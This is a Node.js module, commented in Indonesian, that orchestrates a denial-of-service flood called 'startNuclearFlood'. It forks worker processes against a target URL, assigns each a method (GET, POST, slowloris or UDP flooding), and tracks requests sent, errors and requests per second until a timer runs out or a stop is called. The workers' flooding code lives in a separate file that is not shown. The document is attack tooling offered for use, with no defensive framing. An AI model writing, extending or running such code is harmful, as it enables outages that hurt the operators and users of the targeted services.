const cluster = require('cluster');
const os = require('os');
const url = require('url');
const path = require('path');

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
    if (cluster.isPrimary) {
        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: path.join(__dirname, 'worker.js'),
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let lastTotalSent = 0;
        let currentRps = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            currentRps = Math.round((totalSent - lastTotalSent) / 5);
            lastTotalSent = totalSent;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining,
                rps: currentRps
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        const numCPUs = 2;
        const attackMethods = ['get', 'post', 'slowloris', 'udp'];
        
        for (let i = 0; i < numCPUs; i++) {
            const workerAttackType = attackMethods[i % attackMethods.length];
            const worker = cluster.fork({ 
                ATTACK_TYPE: workerAttackType
            });
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

module.exports = { startNuclearFlood };